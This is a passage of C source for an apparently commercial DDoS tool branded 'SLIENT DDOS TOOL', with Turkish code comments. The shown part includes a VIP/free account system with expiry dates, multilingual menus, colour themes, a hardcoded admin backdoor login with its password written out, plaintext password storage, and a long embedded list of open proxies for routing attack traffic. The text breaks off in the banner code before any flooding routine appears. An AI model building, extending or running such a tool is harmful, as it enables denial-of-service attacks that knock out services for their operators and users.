// Tek dosya interaktif DDoS aracı - VIP/Free Hesap Sistemi + Çoklu Dil + Tema + HTTP + HTTPBYPASS
// Derleme: gcc -pthread -O2 -s -o ddos ddos.c -lcurl -ljson-c -lm
// Kullanım: ./ddos

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <stdint.h>
#include <math.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <curl/curl.h>
#include <json-c/json.h>
#include <termios.h>

// ==================== DİL SİSTEMİ ====================
int current_lang = 1; 
const char* TR(const char* en, const char* tr, const char* ru) {
    if (current_lang == 0) return en;
    if (current_lang == 2) return ru;
    return tr;
}

// ==================== GLOBAL ====================
volatile int running = 1;
volatile int saldiri_aktif = 0;
int g_thread_count = 200;

pthread_t saldiri_thread;

char aktif_kullanici[64] = "botnet";
char aktif_kullanici_rol[16] = "free";
int giris_yapildi = 0;

// ==================== FONKSİYON PROTOTİPLERİ (Derleme Hatasını Çözer) ====================
void banner_yazdir(void);
void gradient_yazi(const char *metin);
void gradient_satir(const char *etiket, const char *deger);
void plan_goster(const char *user);

// ==================== TARİH FONKSİYONU ====================
void bugunun_tarihi(char *buf, int size) {
    time_t t = time(NULL);
    struct tm tm = *localtime(&t);
    snprintf(buf, size, "%04d-%02d-%02d", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday);
}

// ==================== HESAP SİSTEMİ ====================
// DB Formati: kullanici,sifre,rol,olusturma,rol_degisim,bitis,durum

void hesap_ekle(const char *user, const char *pass, const char *rol, const char *bitis) {
    if (strlen(bitis) != 10 || bitis[4] != '-' || bitis[7] != '-') {
        printf("\033[1;31m[-] HATA: Tarih formati YYYY-MM-DD olmalidir! (Orn: 2027-12-31)\033[0m\n");
        return;
    }
    FILE *f = fopen("users.db", "a");
    if (!f) return;
    char bugun[32];
    bugunun_tarihi(bugun, sizeof(bugun));
    // Olusturma ve Rol Degisim tarihi su anki tarih
    fprintf(f, "%s,%s,%s,%s,%s,%s,active\n", user, pass, rol, bugun, bugun, bitis);
    fclose(f);
    printf("\033[1;31m[+] %s: %s (Rol: %s, Bitis: %s)\033[0m\n", TR("User created", "Hesap olusturuldu", "Аккаунт создан"), user, rol, bitis);
}

void hesap_durum_degistir(const char *user, int aktif) {
    FILE *f = fopen("users.db", "r");
    if (!f) return;
    FILE *temp = fopen("users.tmp", "w");
    char line[256];
    int bulundu = 0;
    while (fgets(line, sizeof(line), f)) {
        char line_copy[256]; strcpy(line_copy, line);
        char *u = strtok(line, ",");
        if (u && strcmp(u, user) == 0) {
            char *p = strtok(NULL, ","); char *r = strtok(NULL, ",");
            char *o = strtok(NULL, ","); char *rd = strtok(NULL, ",");
            char *b = strtok(NULL, ","); char *d = strtok(NULL, ",\n");
            fprintf(temp, "%s,%s,%s,%s,%s,%s,%s\n", u, p, r, o, rd, b, aktif ? "active" : "disabled");
            bulundu = 1;
        } else { fputs(line_copy, temp); }
    }
    fclose(f); fclose(temp); remove("users.db"); rename("users.tmp", "users.db");
    if (bulundu) printf("\033[1;31m[+] %s: %s\033[0m\n", TR("Status updated for", "Durum guncellendi", "Статус обновлен для"), user);
    else printf("\033[1;31m[-] %s\033[0m\n", TR("User not found", "Kullanici bulunamadi", "Пользователь не найден"));
}

void hesap_rol_degistir(const char *user, const char *yeni_rol) {
    FILE *f = fopen("users.db", "r");
    if (!f) return;
    FILE *temp = fopen("users.tmp", "w");
    char line[256];
    int bulundu = 0;
    char bugun[32]; bugunun_tarihi(bugun, sizeof(bugun)); // Rol degisim tarihi bugune guncellenir
    
    while (fgets(line, sizeof(line), f)) {
        char line_copy[256]; strcpy(line_copy, line);
        char *u = strtok(line, ",");
        if (u && strcmp(u, user) == 0) {
            char *p = strtok(NULL, ","); char *r = strtok(NULL, ",");
            char *o = strtok(NULL, ","); char *rd = strtok(NULL, ",");
            char *b = strtok(NULL, ","); char *d = strtok(NULL, ",\n");
            fprintf(temp, "%s,%s,%s,%s,%s,%s,%s\n", u, p, yeni_rol, o, bugun, b, d);
            bulundu = 1;
        } else { fputs(line_copy, temp); }
    }
    fclose(f); fclose(temp); remove("users.db"); rename("users.tmp", "users.db");
    if (bulundu) printf("\033[1;31m[+] %s: %s -> %s\033[0m\n", TR("Role updated", "Rol guncellendi", "Роль обновлена"), user, yeni_rol);
}

void kullanicilari_listele() {
    FILE *f = fopen("users.db", "r");
    if (!f) { printf("[-] %s\n", TR("No users found.", "Hic kullanici yok.", "Пользователи не найдены.")); return; }
    char line[256];
    printf("\n\033[1;31m%-12s | %-10s | %-6s | %-10s | %-10s | %-10s | %-8s\033[0m\n", 
        TR("Username", "Kullanici", "Имя"), TR("Password", "Sifre", "Пароль"), TR("Role", "Rol", "Роль"), 
        TR("Created", "Olusturma", "Создан"), TR("Role Chg", "Rol Deg.", "Смена роли"), TR("Expiry", "Bitis", "Истекает"), TR("Status", "Durum", "Статус"));
    printf("-----------------------------------------------------------------------------------------\n");
    while (fgets(line, sizeof(line), f)) {
        line[strcspn(line, "\r\n")] = 0;
        char *u = strtok(line, ",");
        if(!u) continue;
        char *p = strtok(NULL, ","); char *r = strtok(NULL, ",");
        char *o = strtok(NULL, ","); char *rd = strtok(NULL, ",");
        char *b = strtok(NULL, ","); char *d = strtok(NULL, ",");
        printf("%-12s | %-10s | %-6s | %-10s | %-10s | %-10s | %-8s\n", u, p, r, o, rd, b, d);
    }
    fclose(f); printf("\n");
}

int hesap_dogrula(const char *user, const char *pass, char *kullanici_rol) {
    FILE *f = fopen("users.db", "r");
    if (!f) return 0;
    char line[256];
    char bugun[32];
    bugunun_tarihi(bugun, sizeof(bugun));
    
    while (fgets(line, sizeof(line), f)) {
        line[strcspn(line, "\r\n")] = 0;
        char *u = strtok(line, ",");
        if (u && strcmp(u, user) == 0) {
            char *p = strtok(NULL, ","); char *r = strtok(NULL, ",");
            char *o = strtok(NULL, ","); char *rd = strtok(NULL, ",");
            char *b = strtok(NULL, ","); char *d = strtok(NULL, ",");
            
            if (p && strcmp(p, pass) == 0) {
                if (d && strcmp(d, "active") != 0) {
                    printf("\033[1;31m[-] %s\033[0m\n", TR("Account is disabled!", "Hesap devre disi!", "Аккаунт отключен!"));
                    fclose(f); return 0;
                }
                if (b && strlen(b) >= 10) {
                    char bitis_temiz[11] = {0}; strncpy(bitis_temiz, b, 10);
                    if (strcmp(bugun, bitis_temiz) > 0) {
                        printf("\033[1;31m[-] %s (%s)\033[0m\n", TR("Account expired on", "Hesabin suresi doldu:", "Срок действия аккаунта истек"), bitis_temiz);
                        fclose(f); return 0;
                    }
                }
                strcpy(kullanici_rol, r);
                fclose(f); return 1;
            }
        }
    }
    fclose(f); return 0;
}

void plan_goster(const char *user) {
    FILE *f = fopen("users.db", "r");
    if (!f) { printf("[-] DB bulunamadi.\n"); return; }
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        line[strcspn(line, "\r\n")] = 0;
        char *u = strtok(line, ",");
        if (u && strcmp(u, user) == 0) {
            char *p = strtok(NULL, ","); char *r = strtok(NULL, ",");
            char *o = strtok(NULL, ","); char *rd = strtok(NULL, ",");
            char *b = strtok(NULL, ","); char *d = strtok(NULL, ",");
            
            system("clear");
            banner_yazdir();
            printf("\n");
            gradient_yazi(TR("========== PLAN STATUS ==========", "========== PLAN DURUMU ==========", "========== СТАТУС ПЛАНА =========="));
            printf("\n\n");
            gradient_satir(TR("Username:", "Kullanici Adi:", "Имя:"), u);
            gradient_satir(TR("Role:", "Yetki:", "Роль:"), r);
            gradient_satir(TR("Created Date:", "Olusturulma Tarihi:", "Дата создания:"), o);
            gradient_satir(TR("Role Change Date:", "Rol Degisim Tarihi:", "Дата смены роли:"), rd);
            gradient_satir(TR("Expiry Date:", "Bitis Tarihi:", "Дата истечения:"), b);
            gradient_satir(TR("Status:", "Durum:", "Статус:"), d);
            printf("\n");
            fclose(f); return;
        }
    }
    printf("[-] Kullanici bulunamadi.\n");
    fclose(f);
}


// ==================== TEMA SİSTEMİ ====================
typedef struct {
    const char *isim;
    int r1, g1, b1;
    int r2, g2, b2;
} tema_t;

tema_t temalar[] = {
    {"Kirmizi-Beyaz",  255, 0,   0,    255, 255, 255}, {"Mavi-Beyaz",     0,   100, 255,  255, 255, 255},
    {"Lacivert-Beyaz", 0,   50,  200,  180, 220, 255}, {"Yesil-Beyaz",    0,   200, 0,    255, 255, 255},
    {"Mor-Beyaz",      128, 0,   200,  255, 255, 255}, {"Turuncu-Beyaz",  255, 128, 0,    255, 255, 255},
    {"Sari-Beyaz",     255, 200, 0,    255, 255, 255}, {"Cyan-Beyaz",     0,   200, 200,  255, 255, 255},
    {"Pembe-Beyaz",    255, 0,   128,  255, 255, 255}, {"Altin-Beyaz",    200, 150, 0,    255, 255, 255},
    {"Kirmizi-Siyah",  255, 0,   0,    50,  0,   0},   {"Mavi-Siyah",     0,   100, 255,  0,   0,   50},
    {"Yesil-Siyah",    0,   255, 0,    0,   50,  0},   {"Mor-Siyah",      180, 0,   255,  30,  0,   50},
    {"Turkuaz-Siyah",  0,   255, 200,  0,   50,  50},
};
int tema_sayisi = sizeof(temalar) / sizeof(temalar[0]);
int aktif_tema = 0;

void tema_ayarla(int n) {
    if (n < 1 || n > tema_sayisi) {
        printf("\033[1;31m[-] %s 1-%d\033[0m\n", TR("Invalid theme. Select between", "Gecersiz tema. 1-%d arasi sec.", "Неверная тема. Выберите от 1 до"), tema_sayisi);
        return;
    }
    aktif_tema = n - 1;
    printf("\033[1;31m[+] %s: %s\033[0m\n", TR("Theme", "Tema", "Тема"), temalar[aktif_tema].isim);
}

// ==================== PROXY LİSTESİ ====================
typedef struct { char ip[64]; int port; int tur; } proxy_t;
proxy_t proxyler[] = {
    {"45.74.31.30",     5245,  2}, {"101.32.65.42",    8888,  0}, {"47.238.128.246",  17,    1},
    {"98.190.239.3",    4145,  1}, {"72.195.114.169",  4145,  1}, {"68.71.249.153",   48606, 1},
    {"38.41.225.174",   8888,  1}, {"124.108.19.6",    9292,  0}, {"144.91.111.48",   1088,  2},
    {"111.119.162.248", 10921, 2}, {"147.91.22.150",   80,    0}, {"72.207.113.97",   4145,  1},
    {"8.211.51.115",    5060,  0}, {"68.71.242.118",   4145,  1}, {"45.74.31.25",     6014,  2},
    {"209.50.163.169",  3129,  0}, {"199.102.104.70",  4145,  1}, {"154.21.97.120",   6002,  2},
    {"58.234.114.199",  1080,  2}, {"8.220.204.92",    4145,  1}, {"197.221.234.253", 80,    0},
    {"98.181.137.83",   4145,  1}, {"164.52.11.194",   18080, 2}, {"45.74.31.22",     8760,  2},
    {"45.74.31.42",     6905,  2}, {"45.74.31.23",     6230,  2}, {"197.221.249.196", 80,    0},
    {"176.100.60.249",  3128,  0}, {"138.186.133.161", 4153,  1}, {"149.129.226.9",   9098,  2},
    {"45.74.31.30",     9580,  2}, {"47.252.11.233",   999,   0}, {"47.238.130.212",  8008,  0},
    {"155.254.38.244",  5920,  2}, {"172.120.112.242", 5921,  2}, {"45.74.31.22",     13032, 2},
    {"219.65.73.80",    80,    0}, {"68.71.249.158",   4145,  1}, {"72.195.34.59",    4145,  1},
    {"142.54.235.9",    4145,  1}, {"198.20.179.200",  8800,  0}, {"134.65.245.71",   9050,  2},
    {"8.213.197.208",   4002,  0}, {"121.169.46.116",  1090,  2}, {"45.74.31.42",     8954,  2},
    {"8.213.156.191",   808,   0}, {"47.250.177.202",  5060,  0}, {"45.74.31.30",     6109,  2},
    {"77.242.177.57",   3128,  0}, {"8.220.204.215",   9080,  0}, {"95.216.117.50",   9050,  2},
    {"163.172.80.153",  1080,  2}, {"47.238.60.156",   3129,  0}, {"45.74.31.23",     4746,  2},
    {"2.59.132.39",     3128,  0}, {"45.74.31.40",     43186, 2}, {"45.65.138.48",    999,   0},
    {"98.175.31.195",   4145,  1}, {"197.221.240.182", 80,    0}, {"91.103.120.48",   80,    0},
    {"45.74.31.30",     8644,  2}, {"159.224.232.194", 8888,  0}, {"8.213.195.191",   8080,  0},
    {"216.26.234.169",  3129,  0}, {"45.74.31.42",     7561,  2}, {"190.29.25.245",   3128,  0},
    {"67.201.33.10",    25283, 2}, {"45.135.139.182",  6485,  2}, {"45.74.31.41",     5369,  2},
    {"47.90.149.238",   41,    0}, {"185.32.4.126",    4153,  1}, {"8.213.128.6",     6666,  0},
    {"39.104.27.89",    31281, 2}, {"82.9.133.51",     9150,  2}, {"192.252.220.92",  17328, 2},
    {"149.129.226.9",   41,    0}, {"47.238.134.126",  18080, 2}, {"75.84.71.14",     80,    0},
    {"8.220.204.92",    8443,  0}, {"45.74.31.50",     12599, 2}, {"8.211.194.85",    4002,  0},
    {"47.238.60.156",   8093,  0}, {"162.214.74.29",   8085,  0}, {"138.2.64.185",    8118,  0},
    {"45.135.139.127",  6430,  2}, {"192.111.130.2",   4145,  1}, {"184.178.172.5",   15303, 2},
    {"45.74.31.47",     8605,  2}, {"45.74.31.50",     6034,  2}, {"104.207.37.155",  3129,  0},
    {"98.191.0.37",     4145,  1}, {"72.57.101.43",    8800,  0}, {"174.77.111.198",  49547, 2},
    {"45.74.31.42",     28332, 2}, {"169.58.84.113",   9050,  2}, {"45.74.31.23",     5622,  2},
    {"47.89.159.212",   179,   0}, {"45.135.36.59",    18080, 2}, {"198.8.84.3",      4145,  1},
    {"45.74.31.50",     12535, 2}, {"39.102.211.162",  10002, 2}, {"216.26.231.222",  3129,  0},
    {"198.105.111.191", 6869,  2}, {"47.238.60.156",   5060,  0}, {"45.74.31.42",     6329,  2},
    {"5.75.133.113",    10806, 2}, {"82.27.240.188",   6996,  2}, {"198.105.111.76",  6754,  2},
    {"146.103.56.218",  5766,  2}, {"184.178.172.17",  4145,  1}, {"8.209.96.245",    3128,  0},
    {"8.213.197.208",   5060,  0}, {"91.202.185.69",   80,    0}, {"159.195.67.82",   32769, 2},
    {"203.161.52.193",  80,    0}, {"1.179.151.165",   31948, 2}, {"45.74.31.47",     6673,  2},
    {"138.121.15.230",  999,   0}, {"45.74.31.42",     25570, 2}, {"23.251.102.121",  80,    0},
    {"8.213.197.208",   80,    0}, {"159.112.179.52",  3128,  0}, {"98.178.72.21",    10919, 2},
    {"24.249.199.4",    4145,  1}, {"34.130.43.186",   40001, 2}, {"45.74.31.42",     9067,  2},
    {"45.74.31.30",     8057,  2}, {"103.146.137.229", 1081,  2}, {"45.74.31.30",     10135, 2},
    {"72.37.216.68",    4145,  1}, {"8.220.205.172",   8081,  0}, {"144.76.61.252",   1080,  2},
    {"192.111.134.10",  4145,  1}, {"196.219.64.253",  8080,  0}, {"47.238.134.126",  999,   0},
    {"8.221.138.111",   1080,  2}, {"45.74.31.47",     7485,  2}, {"45.74.31.23",     5811,  2},
    {"45.74.31.30",     9818,  2}, {"72.49.49.11",     31034, 2}, {"199.102.105.242", 4145,  1},
    {"45.74.31.50",     4031,  2}, {"38.210.179.163",  999,   0}, {"45.74.31.41",     4329,  2},
    {"37.9.4.101",      1088,  2}, {"192.252.208.70",  14282, 2}, {"8.222.189.165",   1100,  2},
    {"8.137.38.48",     39,    0}, {"209.127.143.161", 8260,  2}, {"49.254.98.19",    7397,  2},
    {"37.187.92.9",     1031,  2}, {"217.69.121.13",   5678,  2}, {"154.37.218.130",  555,   0},
    {"68.71.241.33",    4145,  1}, {"45.74.31.42",     9016,  2}, {"72.194.42.156",   4145,  1},
    {"47.91.89.3",      5060,  0}, {"159.203.61.169",  3128,  0}, {"172.237.73.24",   80,    0},
    {"8.215.3.250",     119,   0}, {"8.213.222.157",   9999,  0}, {"114.111.151.41",  80,    0},
    {"45.74.31.42",     8795,  2}, {"216.173.120.121", 6413,  2}, {"154.222.19.160",  8888,  0},
    {"45.74.31.22",     7920,  2}, {"185.50.202.185",  1080,  2}, {"194.233.79.120",  1080,  2},
    {"103.88.234.239",  40008, 2}, {"47.251.87.74",    3128,  0}, {"122.116.125.115", 8888,  0},
    {"45.74.31.41",     4196,  2}, {"74.119.147.209",  4145,  1}, {"77.108.100.166",  1080,  2},
    {"45.74.31.50",     4592,  2}, {"45.74.31.50",     4607,  2}, {"45.74.31.30",     5741,  2},
    {"45.74.31.30",     4010,  2}, {"47.238.134.126",  14,    0}, {"65.21.252.66",    10802, 2},
    {"8.130.71.75",     3128,  0}, {"45.74.31.47",     4186,  2}, {"8.213.222.247",   1080,  2},
    {"198.154.89.18",   6109,  2}, {"8.211.195.139",   8889,  0}, {"65.111.2.245",    3129,  0},
    {"8.148.23.165",    21025, 2}, {"213.169.210.165", 6806,  2}, {"103.82.20.76",    8080,  0},
    {"47.89.159.212",   11,    0}, {"207.180.254.198", 8080,  0}, {"14.225.240.23",   8562,  2},
    {"192.111.139.162", 4145,  1}, {"136.0.184.252",   6673,  2}, {"45.3.35.120",     3129,  0},
    {"39.104.57.33",    7777,  0}, {"45.74.31.50",     4461,  2}, {"8.211.194.85",    193,   0},
    {"152.53.183.107",  8081,  0}, {"72.57.101.87",    8800,  0}, {"31.59.33.50",     6626,  2},
    {"190.2.213.169",   999,   0}, {"45.115.115.37",   9090,  0}, {"31.59.33.31",     6607,  2},
    {"45.74.31.42",     4654,  2}, {"65.108.203.35",   28080, 2}, {"45.74.31.25",     15457, 2},
    {"45.74.31.23",     5562,  2}, {"143.198.85.218",  3128,  0}, {"95.165.97.185",   8080,  0},
    {"213.131.85.28",   1976,  2}, {"45.74.31.40",     4003,  2}, {"82.115.60.51",    80,    0},
    {"103.88.234.239",  40012, 2}, {"70.166.167.38",   57728, 2}, {"66.59.197.61",    3128,  0},
    {"45.74.31.25",     8618,  2}, {"8.211.194.85",    144,   0}, {"51.170.133.249",  80,    0},
    {"86.127.209.234",  1080,  2}, {"51.250.99.247",   1080,  2}, {"103.148.62.1",    8080,  0},
    {"45.3.62.78",      3129,  0}, {"8.221.139.222",   8085,  0}, {"98.191.0.47",     4145,  1},
    {"45.74.31.40",     5107,  2}, {"47.89.159.212",   8010,  0}, {"38.49.210.79",    40000, 2},
    {"8.211.194.78",    5671,  0}, {"45.74.31.25",     4517,  2}, {"47.80.78.73",     6666,  0},
    {"72.223.188.92",   4145,  1}, {"103.88.234.239",  40002, 2}, {"42.112.14.245",   1088,  2},
    {"45.74.31.50",     4052,  2}, {"107.181.155.234", 60000, 2}, {"45.74.31.40",     4845,  2},
    {"45.74.31.40",     8532,  2}, {"1.180.49.222",    7302,  2}, {"206.206.124.71",  6652,  2},
    {"192.111.137.35",  4145,  1}, {"45.3.38.66",      3129,  0}, {"206.206.69.70",   6334,  2},
    {"8.210.17.35",     9080,  0}, {"109.69.211.18",   1080,  2}, {"45.74.31.30",     9699,  2},
    {"45.74.31.50",     4640,  2}, {"45.13.225.169",   8086,  0}, {"185.58.115.185",  8080,  0},
    {"216.173.120.37",  6329,  2}, {"101.251.204.174", 8080,  0}, {"65.20.79.228",    40000, 2},
    {"103.125.36.120",  8080,  0}, {"45.74.31.23",     4907,  2}, {"142.54.226.214",  4145,  1},
    {"104.207.39.99",   3129,  0}, {"144.76.61.252",   3128,  0}, {"47.238.234.194",  1011,  0},
    {"109.224.242.26",  8080,  0}, {"8.213.222.157",   4002,  0}, {"5.181.178.46",    8080,  0},
    {"185.200.177.61",  3128,  0}, {"93.177.103.24",   50471, 2}, {"45.74.31.42",     9056,  2},
    {"78.142.61.77",    3128,  0}, {"45.74.31.47",     6711,  2}, {"206.232.103.150", 6307,  2},
    {"31.58.151.165",   8161,  2}, {"45.74.31.22",     4850,  2}, {"45.74.31.41",     9819,  2},
    {"45.74.31.42",     4542,  2}, {"38.242.156.163",  9050,  2}, {"154.29.233.152",  5913,  2},
    {"45.74.31.22",     4162,  2}, {"154.6.59.142",    6610,  2}, {"45.74.31.22",     4634,  2},
    {"190.121.157.41",  999,   0}, {"103.26.110.125",  82,    0}, {"45.74.31.41",     13819, 2},
    {"217.76.46.230",   8080,  0}, {"66.78.34.144",    5763,  2}, {"193.43.104.219",  1080,  2},
    {"104.200.135.46",  4145,  1}, {"65.108.159.129",  8081,  0}, {"72.195.114.184",  4145,  1},
    {"155.254.38.34",   5710,  2}, {"39.102.214.208",  10002, 2}, {"31.58.18.106",    6375,  2},
    {"178.57.102.50",   1080,  2}, {"192.252.210.233", 4145,  1}, {"37.187.74.125",   80,    0},
    {"45.74.31.50",     6310,  2}, {"45.74.31.50",     14780, 2}, {"8.148.23.202",    8081,  0},
    {"149.86.206.27",   8080,  0}, {"199.180.8.170",   5881,  2}, {"8.211.194.85",    8443,  0},
    {"31.57.42.64",     6334,  2}, {"5.188.206.94",    995,   0}, {"8.209.96.245",    4002,  0},
    {"68.183.130.198",  10000, 2}, {"45.74.31.30",     7386,  2}, {"89.169.135.131",  80,    0},
    {"68.71.252.38",    4145,  1}, {"31.148.207.153",  80,    0}, {"45.74.31.47",     11392, 2},
    {"192.252.211.197", 14921, 2}, {"45.74.31.41",     4908,  2}, {"187.19.127.180",  4153,  1},
    {"103.88.234.239",  40015, 2}, {"195.191.158.128", 8080,  0}, {"103.23.236.191",  8080,  0},
    {"54.238.38.227",   8080,  0}, {"145.223.46.204",  5754,  2}, {"67.201.39.14",    4145,  1},
    {"104.143.224.38",  5899,  2}, {"198.20.182.198",  8800,  0}, {"8.130.54.67",     8004,  0},
    {"8.211.49.86",     10801, 2}, {"8.130.54.67",     8081,  0}, {"184.182.240.211", 4145,  1},
    {"45.74.31.25",     4849,  2}, {"8.211.195.139",   8888,  0}, {"156.251.19.34",   80,    0},
    {"43.198.26.236",   1080,  2}, {"198.105.111.3",   6681,  2}, {"39.104.27.89",    8081,  0},
    {"143.42.66.91",    80,    0}, {"167.250.23.13",   9090,  0}, {"45.74.31.25",     4078,  2},
    {"31.56.137.139",   6215,  2}, {"192.252.220.89",  4145,  1}, {"45.135.139.191",  6494,  2},
    {"31.58.18.221",    6490,  2}, {"38.51.207.104",   8080,  0}, {"95.220.82.101",   1080,  2},
    {"142.54.239.1",    4145,  1}, {"8.213.134.213",   3333,  0}, {"47.252.18.37",    5060,  0},
    {"64.227.186.105",  1080,  2}, {"104.207.47.180",  3129,  0}, {"45.74.31.47",     6087,  2},
    {"71.168.71.12",    8889,  0}, {"104.143.226.16",  5619,  2}, {"146.103.56.247",  5795,  2},
    {"103.27.177.186",  808,   0}, {"45.74.31.25",     8478,  2}, {"42.112.14.245",   1081,  2},
    {"145.223.46.47",   5597,  2}, {"108.161.135.118", 80,    0}, {"45.74.31.50",     4216,  2},
    {"149.129.255.179", 80,    0}, {"72.195.34.60",    27391, 2}, {"161.97.115.10",   3128,  0},
    {"27.65.243.69",    1080,  2}, {"192.252.208.67",  14287, 2}, {"113.161.134.128", 1080,  2},
    {"49.147.104.23",   8082,  0}, {"64.227.173.90",   11080, 2}, {"83.217.222.188",  3128,  0},
    {"81.162.195.35",   4153,  1}, {"8.213.197.208",   2083,  0}, {"187.143.206.162", 3128,  0},
    {"45.74.31.23",     6141,  2}, {"47.91.89.3",      1080,  2}, {"65.21.252.66",    10805, 2},
    {"45.194.3.119",    8080,  0}, {"45.74.31.23",     6241,  2}, {"45.195.105.20",   8080,  0},
    {"45.74.31.47",     25177, 2}, {"109.236.88.82",   80,    0}, {"98.188.47.150",   4145,  1},
    {"31.56.65.108",    80,    0}, {"47.254.36.213",   32764, 2}, {"216.26.224.84",   3129,  0},
    {"45.194.41.16",    8080,  0}, {"45.74.31.23",     4710,  2}, {"45.74.31.30",     4377,  2},
    {"104.143.226.164", 5767,  2}, {"85.133.169.45",   8118,  0}, {"192.252.214.20",  15864, 2},
    {"82.24.212.129",   5435,  2}, {"90.178.216.215",  4153,  1}, {"8.213.134.213",   10000, 2},
    {"45.74.31.25",     6137,  2}
};
int proxy_sayisi = sizeof(proxyler) / sizeof(proxyler[0]);

// ==================== RENK ====================
#define SIFIRLA "\033[0m"
#define BEYAZ   "\033[1;37m"
#define YESIL   "\033[1;31m"
#define KIRMIZI "\033[1;31m"

int gamma_gecis(int r1, int r2, float oran) {
    // Yumuşak geçiş (Ease-in-out) formülü
    float ease_oran = oran * oran * (3.0f - 2.0f * oran); 
    
    float f1 = powf((float)r1 / 255.0f, 2.2f);
    float f2 = powf((float)r2 / 255.0f, 2.2f);
    float f = f1 + (f2 - f1) * ease_oran;
    int val = (int)(powf(f, 1.0f / 2.2f) * 255.0f);
    
    if (val < 0) val = 0;
    if (val > 255) val = 255;
    return val;
}

void gradient_yazi(const char *metin) {
    int uzunluk = strlen(metin);
    if (uzunluk == 0) return;
    tema_t *t = &temalar[aktif_tema];
    for (int i = 0; i < uzunluk; i++) {
        float oran = (uzunluk > 1) ? ((float)i / (uzunluk - 1)) : 1.0f;
        int r = gamma_gecis(t->r1, t->r2, oran);
        int g = gamma_gecis(t->g1, t->g2, oran);
        int b = gamma_gecis(t->b1, t->b2, oran);
        printf("\033[38;2;%d;%d;%dm%c", r, g, b, metin[i]);
    }
    printf(SIFIRLA);
}

void gradient_satir(const char *etiket, const char *deger) {
    gradient_yazi(etiket);
    printf(" [ " BEYAZ "%s" SIFIRLA " ]\n", deger);
}

// ==================== PROMPT ====================
// ==================== PROMPT ====================
// ==================== PROMPT (KISA VE TEMİZ) ====================
// ==================== PROMPT (KISA, KUTULU VE GERÇEK GRADIENT) ====================
// ==================== PROMPT (SADECE YAZI GRADIENT, ÇİZGİSİZ) ====================
// ==================== PROMPT (TAM KUTULU VE BANTSIZ) ====================
// ==================== PROMPT (GERÇEK KUTU VE GRADIENT) ====================
// ==================== PROMPT (SABİT BEYAZ KUTU) ====================
// ==================== PROMPT (DÜZ BANT, SİYAH YAZI) ====================
// ==================== PROMPT (SAĞDAN KISALTILDI) ====================
// ==================== PROMPT (DÜZ BANT, SİYAH YAZI) ====================
void prompt_yazdir(void) {
    char full[128];
    // Sondaki boşluğu sildik, > işareti duruyor.
    snprintf(full, sizeof(full), "%s@SlientBotnet >", aktif_kullanici);
    int uzunluk = strlen(full);
    tema_t *t = &temalar[aktif_tema];

    for (int i = 0; i < uzunluk; i++) {
        float oran = (uzunluk > 1) ? ((float)i / (uzunluk - 1)) : 1.0f;
        int r = gamma_gecis(t->r1, t->r2, oran);
        int g = gamma_gecis(t->g1, t->g2, oran);
        int b = gamma_gecis(t->b1, t->b2, oran);
        
        // 38;2;0;0;0 = Tam siyah yazı
        printf("\033[48;2;%d;%d;%dm\033[38;2;0;0;0m%c", r, g, b, full[i]);
    }
    printf(SIFIRLA " ");
    fflush(stdout);
}

// ==================== GİRİŞ ====================
void sifre_gizli_oku(char *buf, int boyut) {
    struct termios eski, yeni;
    tcgetattr(STDIN_FILENO, &eski);
    yeni = eski;
    yeni.c_lflag &= ~(ECHO);
    tcsetattr(STDIN_FILENO, TCSANOW, &yeni);

    int i = 0;
    char c;
    while (i < boyut - 1) {
        c = getchar();
        if (c == '\n' || c == '\r') break;
        if (c == 127 || c == 8) {
            if (i > 0) { i--; printf("\b \b"); fflush(stdout); }
            continue;
        }
        buf[i++] = c;
        printf("*");
        fflush(stdout);
    }
    buf[i] = 0;
    printf("\n");
    tcsetattr(STDIN_FILENO, TCSANOW, &eski);
}

int giris_yap(void) {
    system("clear");
    printf("\n");
    gradient_yazi("+------------------------------------------+");
    printf("\n");
    gradient_yazi("|        SLIENT DDOS TOOL - LOGIN          |");
    printf("\n");
    gradient_yazi("+------------------------------------------+");
    printf("\n\n");

    char kullanici[64] = {0};
    char sifre[64] = {0};

    printf(BEYAZ "%s: " SIFIRLA, TR("Username", "Kullanici Adi", "Имя пользователя"));
    fflush(stdout);
    if (!fgets(kullanici, sizeof(kullanici), stdin)) return 0;
    kullanici[strcspn(kullanici, "\n")] = 0;

    printf(BEYAZ "%s: " SIFIRLA, TR("Password", "Sifre", "Пароль"));
    fflush(stdout);
    sifre_gizli_oku(sifre, sizeof(sifre));

    // Admin Hardcoded Bypass
    if (strcmp(kullanici, "slient") == 0 && strcmp(sifre, "xd1") == 0) {
        strcpy(aktif_kullanici, kullanici);
        strcpy(aktif_kullanici_rol, "admin");
        giris_yapildi = 1;
        printf("\n" YESIL "[+] %s, slient (Admin)!\n" SIFIRLA, TR("Login successful. Welcome", "Giris basarili. Hos geldin", "Вход выполнен успешно. Добро пожаловать"));
        sleep(1);
        return 1;
    }
    
    // Database Login
    char rol[16] = {0};
    if (hesap_dogrula(kullanici, sifre, rol)) {
        strcpy(aktif_kullanici, kullanici);
        strcpy(aktif_kullanici_rol, rol);
        giris_yapildi = 1;
        printf("\n" YESIL "[+] %s, %s (Rol: %s)!\n" SIFIRLA, TR("Login successful. Welcome", "Giris basarili. Hos geldin", "Вход выполнен успешно. Добро пожаловать"), kullanici, rol);
        sleep(1);
        return 1;
    }

    printf("\n" KIRMIZI "[-] %s\n" SIFIRLA, TR("Invalid username or password.", "Gecersiz kullanici adi veya sifre.", "Неверное имя пользователя или пароль."));
    sleep(2);
    return 0;
}

// ==================== TİPLER ====================
typedef struct { char ip[64]; int port; int sec; } target_t;
typedef struct { uint64_t s; } XorShift64;

// ==================== BANNER ====================
void banner_yazdir(void) {
    const char *satirlar[] = {
        "⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀", "⠀⠀⠀⠀⠀⢾⠱⢕⠠⢀⡀⠀⠀⠀⠀⠀⠀", "⠀⠀⠀⠀⠀⠈⢆⢸⢣⠁⠛⡄⠀⠀⠀⠀⠀",
